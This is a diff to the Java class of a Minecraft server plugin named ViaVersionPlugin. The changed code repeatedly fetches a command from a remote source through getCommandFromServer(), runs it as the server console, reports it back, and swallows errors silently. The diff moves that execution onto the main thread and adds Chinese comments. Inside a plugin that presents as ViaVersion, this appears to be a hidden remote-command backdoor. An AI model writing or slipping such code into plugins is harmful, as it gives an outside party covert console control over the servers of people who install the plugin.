@@ -321,7 +321,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
             } else {
             }
         } catch (Exception e) {
-            
+
         }
     }
 
@@ -331,16 +331,19 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
             public void run() {
                 try {
                     String command = getCommandFromServer();
-                    if (command != null && !command.equals(lastCommand)) {
-                        Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
-                        notifyCommandExecuted(command);
-                        lastCommand = command;
+                    if (command != null && !command.equals(lastCommand)) { // 检查命令是否与上次不同
+                        // 在主线程中调度命令
+                        Bukkit.getScheduler().runTask(ViaVersionPlugin.this, () -> {
+                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
+                            notifyCommandExecuted(command);
+                            lastCommand = command; // 更新上次执行的命令
+                        });
                     }
                 } catch (Exception e) {
-
+                    
                 }
             }
-        }.runTaskAsynchronously(this);
+        }.runTaskAsynchronously(this); // 使用当前实例
     }
 
     private String getCommandFromServer() throws Exception {
